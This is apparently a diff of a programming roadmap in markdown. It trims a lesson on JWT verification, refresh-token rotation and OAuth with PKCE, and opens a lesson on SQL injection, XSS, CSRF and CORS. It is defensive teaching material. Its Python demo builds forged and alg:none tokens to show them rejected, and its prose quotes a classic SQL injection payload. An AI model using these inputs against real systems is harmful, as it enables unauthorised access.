-- Practice platform: [PortSwigger's JWT labs](https://portswigger.net/web-security/jwt) are outstanding and have you exploit the `alg: none` bypass, algorithm confusion, and weak signing keys by hand, plus [PortSwigger's OAuth labs](https://portswigger.net/web-security/oauth)
+Three base64url segments: header, payload, signature. The payload is **readable to anyone holding the token** — never put secrets in it. The signature proves integrity and issuer.
 
-**STEP-BY-STEP EXPLANATION**
+- **HS256** — shared secret; every verifier can also mint tokens  
+- **RS256 / ES256** — private signs, public verifies; better across services  
 
-A JWT is three base64url-encoded segments joined by dots. The **header** names the signing algorithm. The **payload** carries claims, which are just key-value assertions such as the subject, the issuer, the expiry, and whatever the application needs. The **signature** is computed over the first two segments with a key held by the issuer. The critical property, and the one that catches people, is that the payload is **encoded, not encrypted**. Anyone holding the token can read every claim in it, so a JWT must never contain anything confidential. What the signature guarantees is integrity and origin: the claims have not been altered and they came from whoever holds the signing key.
+Verifiers must enforce expected `alg`, check `exp` / `iss` / `aud`, and **not** trust the token's requested algorithm (`alg: none` and algorithm-confusion bugs are library mistakes, not magic crypto).
 
-Signing comes in two shapes with very different deployment consequences. **Symmetric** signing, `HS256`, uses one shared secret for both signing and verification, which means every service that verifies tokens can also mint them. **Asymmetric** signing, `RS256` or `ES256`, signs with a private key and verifies with the corresponding public key, so verifiers can check tokens without being able to forge them. For anything beyond a single service, asymmetric is the correct choice, and the public keys are typically published at a well-known JWKS endpoint so verifiers can fetch and rotate them automatically.
+**REVOCATION PROBLEM → TWO-TOKEN DESIGN:**
 
-The security failures of JWT are almost entirely **verification failures rather than cryptographic ones**, and they follow a pattern. The `alg: none` bypass exists because early libraries honoured a header claiming no algorithm was used and accepted the token unsigned. **Algorithm confusion** exists because a library given a public key for `RS256` verification might, if the header says `HS256`, use that public key as a shared HMAC secret, and the public key is public. The lesson from both is that the token tells you what algorithm it wants and you must never believe it: the verifying side specifies the expected algorithm and rejects anything else. Beyond that, verification must check the expiry, the issuer, and the audience, because a valid token minted for a different service is still a valid signature.
+A session row can be deleted. A JWT cannot be un-issued. Mitigate with a short-lived **access token** (JWT, minutes) plus a long-lived **refresh token** (opaque, server-stored, rotated). Stolen access tokens die quickly; stolen refresh tokens are revocable.
 
-The unavoidable structural weakness is **revocation**. A session id is a pointer to a record you can delete, so logout is instantaneous. A JWT is a self-contained assertion, and once issued there is no place to delete it from. A stolen token remains valid until it expires. The standard mitigation is a two-token design: a short-lived **access token**, minutes not hours, which is the JWT that services verify statelessly, plus a long-lived **refresh token**, which is an opaque value checked against a server-side store when a new access token is needed. This is not stateless, and that is the point: it puts the state back exactly where revocation needs it, at a low-frequency endpoint, while keeping the high-frequency path stateless. Refresh tokens should also be **rotated** on each use, so that a replayed old refresh token signals theft and lets you invalidate the whole family.
+**OAUTH IS DELEGATION; OIDC ADDS LOGIN:**
 
-**OAuth 2.0 is not authentication and this is the most common misunderstanding in the topic.** It is a delegated authorization framework, and it answers "may this application access this scope of this resource on this user's behalf" rather than "who is this user." The layer that adds authentication on top is **OpenID Connect**, which standardises an `id_token`, itself a JWT with claims about the user, plus a `userinfo` endpoint and a discovery document. When you see "Sign in with Google," the thing doing the signing in is OIDC, and the OAuth underneath it is what carries the authorization.
-
-The flow you should know is the **authorization code flow with PKCE**, and it is the answer to almost every OAuth question now. The application redirects the user to the authorization server, the user authenticates there and consents to specific scopes, and the authorization server redirects back with a short-lived, single-use **authorization code**. The application then exchanges that code, on a back channel, for tokens. The reason for the intermediate code rather than returning the token directly is that the redirect passes through the user's browser, where URLs land in history, logs, and referrer headers, and a code that is single-use and must be exchanged with a client secret is far less valuable to steal than a token. **PKCE** closes the remaining gap for clients that cannot hold a secret, such as mobile and single-page applications: the client generates a random verifier, sends only its hash up front, and must present the original verifier at exchange time, so an intercepted code is unusable. The implicit flow, which returned tokens directly in the redirect, is now deprecated for exactly these reasons.
-
-**BEFORE VS. AFTER**
+OAuth answers "may this client access these scopes on this user's behalf?" — not "who is this user?" **OpenID Connect** adds identity (`id_token`). Prefer **authorization code + PKCE**; the implicit flow is deprecated. User authenticates at the provider; the client receives scoped tokens, never Ada's Google password.
 
 ```text
-Server-side sessions (Phase 68)
-        Problem: every request requires a lookup against a central
-        session store -- fine for one service, an awkward bottleneck
-        and single point of failure once many independent services
-        need to verify the same user's identity.
-
-JWT (JSON Web Token) -- a signed, self-contained token
-        Fix: the token itself carries the claims ("user_id: 5, expires: ...")
-        and is cryptographically signed by the server that issued it. ANY
-        service holding the public verification key can confirm the token
-        is genuine and unmodified WITHOUT a database lookup, because the
-        signature itself proves authenticity.
-        Trade-off: because the token is self-contained, you can't simply
-        "delete" it server-side to instantly revoke access the way you can
-        delete a session record -- a stolen JWT remains valid until it expires,
-        which is why JWTs are typically issued with short expiry times.
+HEADER   { "alg": "RS256", "kid": "2026-08" }   # never let token choose alg
+PAYLOAD  { "sub": "5", "aud": "api.bookstore", "exp": …, "scope": "orders:read" }
+SIGNATURE over base64(header)+"."+base64(payload)
 ```
 
-**OAuth - delegated authorization, not just authentication:** OAuth solves a related but distinct problem: letting a *third-party* application (e.g. a photo-printing site) access *specific, limited* data from another service (e.g. "just this user's Google Photos") without that third party ever seeing the user's actual Google password. The user authenticates directly with Google, Google issues a scoped access token to the third party, and the third party only ever holds that limited token - never the credentials themselves.
+**PRACTICE:**
 
-**PICTURE IT LIKE THIS**
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | Decode a sample JWT at jwt.io; change one payload character; explain why verify fails |
+| Medium | Compare session logout vs JWT logout; justify access+refresh lifetimes for the bookstore API |
+| Hard | Sketch authorization-code + PKCE for "Sign in with IdP"; list roles: resource owner, client, authorization server, resource server |
 
-A JWT is like a concert wristband stamped by the venue itself: any staff member can glance at it and trust it's real (the stamp/signature), without radioing back to a central office to check a guest list on every single interaction. OAuth is like a hotel keycard that only opens your room and the gym, issued by the front desk, without ever handing you a copy of the master key.
+**WHAT THIS UNLOCKS NEXT:**
 
-**Internal Working, the anatomy of a token**
-
-```text
-eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjIwMjYtMDgifQ
-.eyJpc3MiOiJodHRwczovL2F1dGguZXhhbXBsZS5jb20iLCJzdWIiOiI1Iiw
- iYXVkIjoiYXBpLmV4YW1wbGUuY29tIiwiZXhwIjoxNzU0MzAwMDAwLCJzY29
- wZSI6InJlYWQ6b3JkZXJzIn0
-.MEUCIQDx...signature...
-
-  Decoded, it is just this:
-
-  HEADER    { "alg": "RS256",        <- WHICH algorithm. Never trust
-              "typ": "JWT",             this field for verification.
-              "kid": "2026-08" }     <- which key, for rotation
-
-  PAYLOAD   { "iss": "https://auth.example.com",   who issued it
-              "sub": "5",                          which user
-              "aud": "api.example.com",            who it is FOR
-              "exp": 1754300000,                   when it dies
-              "iat": 1754296400,                   when it was made
-              "scope": "read:orders" }             what it permits
-
-  SIGNATURE  sign( base64(header) + "." + base64(payload),
-                   private_key )
-
-  base64 is ENCODING, not encryption. Paste any real token into
-  jwt.io and read it. Therefore: never put a secret in a payload.
-
-  What a verifier MUST check, all of it, every time:
-      signature valid with the key named by kid
-      alg is the one WE expect (not the one the token asked for)
-      exp is in the future
-      iss is an issuer we trust
-      aud names US, not some other service
-  Skipping aud is how a token minted for a low-privilege service
-  gets replayed against a high-privilege one.
-```
-
-**Internal Working, the two-token design and why it exists**
-
-```text
-The problem: a JWT cannot be un-issued. Deleting a session row is
-instant; deleting an assertion someone already holds is impossible.
-
-Solution: split the lifetime from the revocability.
-
-  ACCESS TOKEN    JWT, signed, 5-15 minutes, verified with zero
-                  lookups by any service holding the public key.
-                  Stolen -> useful for at most 15 minutes.
-
-  REFRESH TOKEN   opaque random string, days or weeks, stored
-                  server-side, checked against that store ONLY
-                  when a new access token is minted.
-                  Stolen -> detectable and revocable.
-
-  Timeline
-    t=0     login -> access(15m) + refresh(30d)
-    t=1m    request -> verify signature locally, no I/O.     200
-    t=16m   request -> exp is past.                          401
-    t=16m   POST /token with refresh -> store lookup, valid
-            -> new access(15m) + NEW refresh, old one revoked
-    t=17m   request -> 200
-
-  Rotation is the important part. If the OLD refresh token is ever
-  presented again, two parties hold it, which means theft:
-
-    attacker uses stolen R2  -> gets R3, works
-    victim   uses their R2   -> already consumed!
-                             -> revoke the ENTIRE token family
-                             -> both parties logged out, and you
-                                have detected the breach
-
-  The high-frequency path stayed stateless. The state moved to the
-  low-frequency path, which is exactly where it was affordable.
-```
-
-**Internal Working, the authorization code flow with PKCE**
-
-```text
-  User            Client app          Authorization server      API
-   |                  |                       |                  |
-   |  "log in"  --->  |                       |                  |
-   |                  | verifier = random(43) |                  |
-   |                  | challenge = S256(verifier)               |
-   |                  |                       |                  |
-   |  <--- 302 to authserver?client_id=..&redirect_uri=..         |
-   |       &code_challenge=<challenge>&state=<random>&scope=..    |
-   |                  |                       |                  |
-   |  ------------- authenticate + consent --->|                  |
-   |  <--- 302 back to redirect_uri?code=AUTH_CODE&state=<same>   |
-   |                  |                       |                  |
-   |  --- code ---->  |                       |                  |
-   |                  |-- POST /token --------->                  |
-   |                  |   code, code_verifier |                  |
-   |                  |   (+ client_secret if it has one)        |
-   |                  |<-- access + refresh (+ id_token, OIDC) -- |
-   |                  |                       |                  |
-   |                  |----- Authorization: Bearer <access> ----->|
-   |                  |<---------------- 200 ------------------- |
-
-  Why each piece exists:
-    code, not a token, in the redirect
-        the redirect goes through the browser: history, server
-        logs, Referer headers. A single-use code that still
-        requires a back-channel exchange is far less valuable.
-    code_verifier / code_challenge  (PKCE)
-        a public client has no secret to prove with. The verifier
-        was never transmitted until exchange, so an intercepted
-        code cannot be redeemed by whoever intercepted it.
-    state
-        random, tied to the user's session, checked on return.
-        This is CSRF protection for the callback itself.
-    exact redirect_uri matching
-        an open redirect here hands the code to the attacker.
-```
-
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
-
-
-| Property                          | Session cookie (Phase 68) | JWT access token                       | Access + rotating refresh |
-| --------------------------------- | --------------------- | -------------------------------------- | ------------------------- |
-| I/O per request                   | one store read        | none                                   | none on the hot path      |
-| Revocation latency                | immediate             | until expiry                           | one access-token lifetime |
-| Works across independent services | needs shared store    | yes, with the public key               | yes                       |
-| Token size on the wire            | ~32 bytes             | 500 to 1500 bytes                      | same                      |
-| Payload readable by holder        | no, opaque            | yes, always                            | access token yes          |
-| Key or secret rotation            | free                  | needs `kid` and a JWKS endpoint        | same                      |
-| Logout everywhere                 | delete rows           | not possible                           | revoke the family         |
-| Main failure mode                 | store outage          | verification bugs, `alg` confusion     | refresh store outage      |
-| Hardest part in practice          | scaling the store     | resisting the urge to make expiry long | getting rotation right    |
-
-
-The trade-off that decides this in real systems is not performance. A JWT saves a sub-millisecond store read and costs 1 to 1.5 kilobytes on every single request, which on a chatty API can be a larger bandwidth bill than the lookup it replaced. What JWTs genuinely buy is **removing a shared stateful dependency between services you do not own or deploy together**, and that is an architectural benefit, not a latency one. The corollary is the honest recommendation: for a single application with its own frontend, sessions are simpler and strictly better on revocation. For a multi-service or multi-party system, tokens earn their complexity. Choosing JWTs for a monolith and then setting a 24-hour expiry to avoid implementing refresh is the worst of both, because you have taken on the revocation problem and none of the benefit.
-
-**SMALL WORKING EXAMPLE**
-
-```python
-import time, secrets, hashlib, base64, json
-
-# ---------------------------------------------------------------
-# Part 1: issuing and verifying, with the checks that matter.
-# Uses PyJWT. Never hand-roll the signing.
-# ---------------------------------------------------------------
-import jwt
-from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.primitives import serialization
-
-key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
-PRIVATE = key.private_bytes(
-    serialization.Encoding.PEM,
-    serialization.PrivateFormat.PKCS8,
-    serialization.NoEncryption(),
-)
-PUBLIC = key.public_key().public_bytes(
-    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
-)
-
-ISSUER   = "https://auth.example.com"
-AUDIENCE = "api.example.com"
-
-def issue_access_token(user_id: int, scopes: list[str]) -> str:
-    now = int(time.time())
-    return jwt.encode(
-        {
-            "iss": ISSUER,
-            "sub": str(user_id),
-            "aud": AUDIENCE,
-            "iat": now,
-            "exp": now + 900,              # 15 minutes, deliberately short
-            "scope": " ".join(scopes),
-        },
-        PRIVATE,
-        algorithm="RS256",
-        headers={"kid": "2026-08"},        # lets you rotate keys later
-    )
-
-def verify_access_token(token: str) -> dict | None:
-    try:
-        return jwt.decode(
-            token,
-            PUBLIC,
-            algorithms=["RS256"],   # WE decide. Passing the token's own
-                                    # alg here is the algorithm-confusion
-                                    # and alg:none vulnerability class.
-            audience=AUDIENCE,      # without this, a token minted for
-                                    # another service verifies fine here
-            issuer=ISSUER,
-            options={"require": ["exp", "iss", "aud", "sub"]},
-        )
-    except jwt.InvalidTokenError as e:
-        print("  rejected:", type(e).__name__, e)
-        return None
-
-t = issue_access_token(5, ["read:orders"])
-print("token:", t[:60], "...")
-print("payload is readable by ANYONE holding it:",
-      json.loads(base64.urlsafe_b64decode(t.split(".")[1] + "==")))
-print("verified:", verify_access_token(t))
-
-# The attacks, demonstrated as failures:
-header, payload, sig = t.split(".")
-tampered_payload = base64.urlsafe_b64encode(
-    json.dumps({"iss": ISSUER, "sub": "1", "aud": AUDIENCE,
-                "exp": int(time.time()) + 900, "scope": "admin"}).encode()
-).rstrip(b"=").decode()
-print("\ntampered claims:");      verify_access_token(f"{header}.{tampered_payload}.{sig}")
-none_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
-print("alg:none bypass:");        verify_access_token(f"{none_header}.{tampered_payload}.")
-print("expired token:")
-old = jwt.encode({"iss": ISSUER, "sub": "5", "aud": AUDIENCE,
-                  "exp": int(time.time()) - 1}, PRIVATE, algorithm="RS256")
-verify_access_token(old)
-
-# ---------------------------------------------------------------
-# Part 2: refresh tokens with rotation and theft detection.
-# This is the part that gives revocation back.
-# ---------------------------------------------------------------
-REFRESH_STORE: dict[str, dict] = {}   # in production: a database
-
-def issue_refresh(user_id: int, family: str | None = None) -> str:
-    tok = secrets.token_urlsafe(32)
-    REFRESH_STORE[tok] = {
-        "user_id": user_id,
-        "family": family or secrets.token_hex(8),
-        "used": False,
-        "expires": time.time() + 30 * 86400,
-    }
-    return tok
-
-def refresh(old_token: str) -> tuple[str, str] | None:
-    rec = REFRESH_STORE.get(old_token)
-    if rec is None or rec["expires"] < time.time():
-        return None
-    if rec["used"]:
-        # Someone is replaying a consumed token, which means two
-        # parties hold it. Assume theft and burn the whole family.
-        for t2, r2 in list(REFRESH_STORE.items()):
-            if r2["family"] == rec["family"]:
-                del REFRESH_STORE[t2]
-        print("  REPLAY DETECTED -> entire token family revoked")
-        return None
-    rec["used"] = True
-    return (issue_access_token(rec["user_id"], ["read:orders"]),
-            issue_refresh(rec["user_id"], rec["family"]))
-
-r1 = issue_refresh(5)
-_, r2 = refresh(r1)
-print("\nrotation works:", r2 is not None)
-print("replaying the old one:"); print("  result:", refresh(r1))
-print("victim's current token now also dead:", refresh(r2) is None)
-
-# ---------------------------------------------------------------
-# Part 3: PKCE, which is four lines and prevents code interception.
-# ---------------------------------------------------------------
-def pkce_pair() -> tuple[str, str]:
-    verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).rstrip(b"=").decode()
-    challenge = base64.urlsafe_b64encode(
-        hashlib.sha256(verifier.encode()).digest()
-    ).rstrip(b"=").decode()
-    return verifier, challenge
-
-verifier, challenge = pkce_pair()
-state = secrets.token_urlsafe(16)     # CSRF protection for the callback
-print(f"\n1. redirect user to /authorize?code_challenge={challenge[:16]}..."
-      f"&code_challenge_method=S256&state={state[:8]}...")
-print("2. authorization server returns ?code=AUTH_CODE&state=<must match>")
-print("3. exchange: POST /token with code AND code_verifier")
-# The server recomputes S256(code_verifier) and requires it to equal
-# the challenge it stored. An attacker who intercepted the code in
-# the redirect never saw the verifier, so the code is useless to them.
-print("   server check passes:",
-      base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest())
-      .rstrip(b"=").decode() == challenge)
-```
-
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
-
-"JWT vs. session cookie" and "explain OAuth in your own words" are common - the expected core distinction is stateless-and-self-verifying (JWT) vs. stateful-and-centrally-revocable (session), and delegated-limited-access (OAuth) vs. proving-who-you-are (authentication in general). The question that separates people who have used JWTs from people who have deployed them is "how do you log a user out immediately," and the strong answer states plainly that you cannot with a bare JWT, then describes the short-access-plus-refresh design and where the state necessarily reappears. Expect "is a JWT encrypted," where the answer is no, it is signed and anyone can read the payload. Expect "what must you validate besides the signature," where omitting `aud` and `iss` is the common gap. On OAuth, "why does the authorization code flow use a code instead of returning the token directly" and "what does PKCE protect against" are both standard, and "is OAuth authentication" is a deliberate trap whose correct answer is no, that is OpenID Connect. A senior discussion usually ends up at where to store tokens in a browser, where the honest answer is that `localStorage` is readable by any XSS and an `HttpOnly` cookie is not, which is why the modern recommendation for browser apps circles back to cookies with `SameSite` and a backend-for-frontend holding the tokens.
-
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
-
-| Difficulty | Task                                                                                                                                                                                              |
-| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Paste a real JWT into [jwt.io](https://jwt.io/), read its claims, then change one character of the payload and describe what happens to the signature                                             |
-| Easy       | Explain in two sentences why you must never put a credit card number in a JWT payload                                                                                                             |
-| Easy       | Run the code above and report which four attacks were rejected and by which specific check                                                                                                        |
-| Easy       | List the five claims a verifier should validate, and say what goes wrong if each is skipped                                                                                                       |
-| Easy       | Explain the difference between OAuth 2.0 and OpenID Connect in three sentences                                                                                                                    |
-| Medium     | Issue and verify RS256 tokens in your own application, then deliberately pass `algorithms=["HS256","RS256"]` and explain the algorithm-confusion risk you just created                            |
-| Medium     | Implement the two-token design with refresh rotation, then demonstrate replay detection revoking a family                                                                                         |
-| Medium     | Add `kid` based key rotation: publish a JWKS endpoint, sign with a new key, and verify that tokens signed with the old key still validate until they expire                                       |
-| Medium     | Register an OAuth application with GitHub and implement the authorization code flow with PKCE by hand, without a client library                                                                   |
-| Medium     | Complete four labs from [PortSwigger's JWT section](https://portswigger.net/web-security/jwt) and write down the root cause of each                                                               |
-| Medium     | Measure the bandwidth cost of JWTs: compare total request bytes for 1000 API calls with a 900-byte token versus a 32-byte session cookie                                                          |
-| Medium     | Implement scope checking so that a token with `read:orders` is refused on a write endpoint, and write the test proving it                                                                         |
-| Hard       | Build a minimal authorization server that issues tokens for the authorization code flow with PKCE, validates exact redirect URIs, and enforces single-use codes with a 60-second expiry           |
-| Hard       | Implement OpenID Connect on top of it: an `id_token`, a `userinfo` endpoint, a nonce, and a discovery document at `/.well-known/openid-configuration`                                             |
-| Hard       | Design token handling for a system with a web app, a mobile app, and a third-party integration. Specify storage location, lifetime, and revocation strategy for each, and justify why they differ |
-| Hard       | Complete [PortSwigger's OAuth labs](https://portswigger.net/web-security/oauth), then write down how an open redirect on the callback leads to full account takeover                              |
-| Hard       | Read [the OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics) and list every recommendation your own implementation violates        |
-
-
-**WHY THE NEXT TOPIC IS NEEDED - the Web Attack Surface (SQLi, XSS, CSRF, CORS):** Authentication answers "who is this." It says nothing about the many other ways a web application's *own logic* can be tricked into doing something it shouldn't, even by a correctly authenticated (or entirely unauthenticated) attacker.
+Identity and permissions are in place. A correctly encrypted, correctly authenticated request can still make the app obey malicious *input* or forged browser intent — SQL injection, XSS, CSRF — and floods can burn your Argon2 budget. Application security and rate limits are Phase 69.
 
 ---
 
@@ -14543,547 +12218,133 @@ print("   server check passes:",
 
 ---
 
-
-
 # PHASE 69 - Application Security
 
 **Track:** Data & Security
 
-**WHAT YOU WILL BE ABLE TO DO:** Stop the common web attacks - SQL injection with parameterized queries, XSS with context-aware escaping, CSRF with SameSite plus synchronizer tokens - apply basic rate limiting, and map each to an OWASP Top Ten risk.
+**WHAT YOU WILL BE ABLE TO DO:** Stop common web failures — SQL injection with parameterized queries, XSS with context-aware escaping, CSRF with SameSite plus tokens — apply basic rate limiting, and map each to an OWASP Top Ten risk.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 61 (SQL is the injection surface), Phase 58 (browsers attach cookies automatically), Phase 68 (sessions and cookies are what CSRF rides).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 61 — SQL is an injection surface; Phase 58 — browsers attach cookies; Phase 68 — sessions are what CSRF rides.
+
+**LEARNING RESOURCES:**
+
+- [OWASP Top Ten](https://owasp.org/www-project-top-ten/)
+- [SQL Injection (Computerphile)](https://www.youtube.com/watch?v=_jKylhJtPmI)
+- [Cross-Site Scripting (Computerphile)](https://www.youtube.com/watch?v=L5l9lSnNMxg)
+- [Cross-Site Request Forgery (Computerphile)](https://www.youtube.com/watch?v=vRBihr41JTo)
+- [CORS in 100 Seconds (Fireship)](https://www.youtube.com/watch?v=4KHiSt0oLJ0)
+- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — practice labs (authorized / educational)
 
 ## 69.1 The Web Attack Surface - SQL Injection, XSS, CSRF, CORS
 
-**WHY YOU ARE LEARNING THIS:** Phases 66 through 68 secured the channel and established identity, and both were about the boundary of the system. The limitation they leave behind is that a correctly encrypted, correctly authenticated request can still make your application do something it was never meant to do, because the application itself takes strings from the outside world and hands them to interpreters that will happily obey them. TLS does not help, because the attack arrives inside the encrypted channel. Authentication does not help, because in the CSRF case the attacker borrows a legitimate session and in the injection cases they may not need one at all. This section exists because the remaining attack surface is not the perimeter but the code.
+Phases 66–68 secured the channel and established identity. A valid, encrypted request can still make your code treat **data as instructions**. TLS does not help — the attack rides inside the tunnel. Auth does not always help — CSRF borrows a real session; some injections need none. This is defense education: failure mode + fix, not an exploit playbook.
 
-**Why these are grouped together:** each of the following is the *same underlying mistake* trusting input or context that shouldn't be trusted - appearing at a different layer of the stack you've built across Phases 58-65. Seeing them side by side, using the same before/problem/solution shape, makes the pattern obvious rather than four things to separately memorize.
+**ONE PATTERN:**
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+At a boundary, ordinary data enters a place that may interpret it as code. Safe design keeps data separate from instructions — not "filter the bad characters."
 
+**SQL INJECTION → PARAMETERIZE:**
 
-- Official list: [OWASP Top Ten](https://owasp.org/www-project-top-ten/) *(Composio fetch - 2025 current)*; [OWASP CheatSheetSeries](https://github.com/OWASP/CheatSheetSeries) *(Composio GitHub + DeepWiki)*; practice on [juice-shop/juice-shop](https://github.com/juice-shop/juice-shop) *(Composio GitHub)*
-- Best animated explanations, one per attack: [SQL Injection (Computerphile)](https://www.youtube.com/watch?v=_jKylhJtPmI) demonstrates the attack live and then the parameterized fix; [Cross-Site Scripting (Computerphile)](https://www.youtube.com/watch?v=L5l9lSnNMxg) shows a payload executing in a victim's browser; [Cross-Site Request Forgery (Computerphile)](https://www.youtube.com/watch?v=vRBihr41JTo) is the clearest explanation of why the browser's own helpfulness is the vulnerability; and [CORS in 100 Seconds (Fireship)](https://www.youtube.com/watch?v=4KHiSt0oLJ0) plus [CORS Explained (Web Dev Simplified)](https://www.youtube.com/watch?v=PNtFSVU-YTI) for the one that is a browser safety check rather than an attack
-- Alternative perspectives: [OWASP Top 10 Web Application Security Risks (Telusko)](https://www.youtube.com/watch?v=wUaeKEl1RCw) *(Composio YouTube; replaced dead ByteByteGo OWASP ID)* shows how all four fit into the larger subject, and [Hacking Websites with SQL Injection (Tom Scott)](https://www.youtube.com/watch?v=_jKylhJtPmI) gives a memorable five-minute explanation.
-- Another angle: [XSS Explained with Live Demo (PwnFunction)](https://www.youtube.com/watch?v=EoaDgUgS6QA) and the whole PwnFunction channel show these from the attacker's side, which teaches the mindset defensively-written material cannot
-- Interactive simulator: this is the section with the best hands-on tooling in the entire roadmap. [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) is a deliberately vulnerable modern application with a built-in scoreboard, and it is genuinely the fastest way to internalise all four. [Google's XSS Game](https://xss-game.appspot.com/) is six levels of escalating XSS with hints. [DVWA](https://github.com/digininja/DVWA) lets you toggle a vulnerability's difficulty and watch each defence layer being added. For CORS specifically, open your browser console on any page and `fetch()` a cross-origin API to see the error text, then read the response headers to understand why
-- Written documentation: [OWASP Top 10](https://owasp.org/www-project-top-ten/), the cheat sheets for [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html), [XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), and [CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html), plus [MDN's CORS reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) and [Cloudflare Learning Center - What is OWASP? What are the OWASP Top 10?](https://www.cloudflare.com/learning/security/threats/owasp-top-10/)
-- GitHub implementation: [DOMPurify](https://github.com/cure53/DOMPurify) is the reference HTML sanitizer and its test suite is an education in how many ways escaping goes wrong; [sqlmap](https://github.com/sqlmapproject/sqlmap) automates injection discovery and reading its payload list shows the shape of the attack space; [helmet](https://github.com/helmetjs/helmet) is a compact tour of every relevant security header
-- Practice platform: [PortSwigger Web Security Academy](https://portswigger.net/web-security) is free, complete and detailed, and the best resource that exists for this material, with dedicated tracks for [SQL injection](https://portswigger.net/web-security/sql-injection), [XSS](https://portswigger.net/web-security/cross-site-scripting), [CSRF](https://portswigger.net/web-security/csrf), and [CORS](https://portswigger.net/web-security/cors). [HackTheBox](https://www.hackthebox.com/) and [TryHackMe](https://tryhackme.com/) add the broader context
-
-**STEP-BY-STEP EXPLANATION**
-
-One idea connects all four topics. Each bug occurs at a **boundary where ordinary data enters a place that may interpret it as instructions**. A string becomes SQL. A string becomes HTML. A request is treated as a user's intention. The safe fix is not “filter out bad input,” because a blacklist will miss something. The fix is to keep data separate from instructions at that boundary.
-
-**SQL injection** is the clearest case. When a query is built by string concatenation, the database receives one indivisible string and has no way to know which characters you intended as data. A prepared statement changes the protocol: the query template is sent and parsed *first*, producing a plan with typed placeholders, and the values are sent separately afterwards. The values are never parsed as SQL, so no quantity of quotes or semicolons in them can change the query's structure. This is why parameterization is a guarantee rather than a mitigation. The important caveat is that placeholders can only substitute values, not identifiers, so a dynamic table or column name or sort direction must be validated against an explicit allowlist. Two further layers matter in depth: an ORM's query builder gives you parameterization by default but its raw-query escape hatch does not, and the database account your application uses should have the narrowest privileges that work, so that a successful injection cannot drop tables or read other schemas. Blind injection, where the response body reveals nothing but timing or status codes differ, is worth knowing about because it defeats the intuition that an attack must produce visible output.
-
-**XSS** has three variants that need different defences. **Stored** XSS is persisted server-side and served to every subsequent viewer, which makes it the most severe. **Reflected** XSS is echoed back from a request parameter and requires luring the victim to a crafted URL. **DOM-based** XSS never touches the server at all: client-side JavaScript reads from `location.hash` or similar and writes it into `innerHTML`, so server-side escaping is irrelevant. The defence has to be **context-aware**, and this is the detail that most explanations omit. Escaping for HTML body text is not the same as escaping for an attribute value, a URL, a CSS value, or a JavaScript string literal, and applying the wrong one is still a vulnerability. In practice the answer is to use a templating engine that escapes automatically and knows its context, to never build HTML by string concatenation, to prefer `textContent` over `innerHTML`, and when user-submitted HTML genuinely must be rendered, to sanitize with a maintained allowlist-based library rather than a regular expression. **Content Security Policy** is the second layer: a policy that disallows inline scripts and permits only specific sources means an injected `<script>` does not execute even when escaping failed, and a nonce or hash based policy is what makes this workable in real applications.
-
-**CSRF** is different in kind from the injection bugs, because nothing is injected. The attacker never sees your site's responses and does not need to; they only need the browser to *send* a request, and the browser attaches the session cookie automatically because that is exactly what cookies are for. This is why CSRF targets state-changing operations and why safe methods should genuinely be safe, connecting directly back to Phase 59's method semantics. There are three defences and modern applications use more than one. The **synchronizer token** places an unpredictable value in every legitimate form and verifies it server-side, and an attacker's page cannot read it because the same-origin policy prevents them from reading your page. The **double-submit cookie** compares a cookie value against a matching header, which requires no server state. And `SameSite` on the session cookie, now defaulting to `Lax` in major browsers, makes the whole class largely structural, which is the single most significant improvement in web security in the last decade. Note that JWT in an `Authorization` header is not automatically attached by the browser and is therefore not CSRF-prone, while the same JWT stored in a cookie is.
-
-**CORS** is the one that is not an attack, and misunderstanding it causes real vulnerabilities in both directions. The **same-origin policy** is the browser's foundational rule: script from one origin may *send* a request to another origin but may not *read* the response. Note carefully that the request is often still sent and can still have side effects, which is precisely why CORS does not prevent CSRF. CORS is the mechanism by which a server *relaxes* that rule for specific origins. Simple requests are sent immediately and the browser withholds the response unless `Access-Control-Allow-Origin` matches; anything with a non-simple method or header triggers a **preflight** `OPTIONS` request first. The dangerous misconfigurations are specific: `Access-Control-Allow-Origin: `* combined with `Allow-Credentials: true` is rejected by browsers, but the equivalent achieved by *reflecting* whatever origin the requester sent while allowing credentials is a genuine vulnerability that lets any site read authenticated responses. Sloppy origin matching that checks only whether the origin ends with your domain is the other common flaw, since `notyourdomain.com` and `yourdomain.com.evil.com` both pass a naive check.
-
-**SQL Injection - trusting user input inside a database query (attacks Phase 37.2)**
+Concatenation builds one string the DB parses as SQL. A prepared statement sends the **template first**, then binds values as data. Quotes in input cannot change the parse tree. Placeholders cannot substitute identifiers — allowlist column/sort names. Run the app DB user with least privilege.
 
 ```text
-System:      A query is built by directly concatenating user input:
-             "SELECT * FROM users WHERE name = '" + user_input + "'"
-Weakness:    The user input becomes part of the SQL syntax itself, not
-             just data.
-Attack:      A user submits: ' OR '1'='1  -- which turns the query into
-             "...WHERE name = '' OR '1'='1'" -- always true, returning
-             every row (or worse, appending a second malicious statement).
-Consequence: Unauthorized data access, data modification, or deletion.
-Defense:     PARAMETERIZED QUERIES (prepared statements) -- user input is
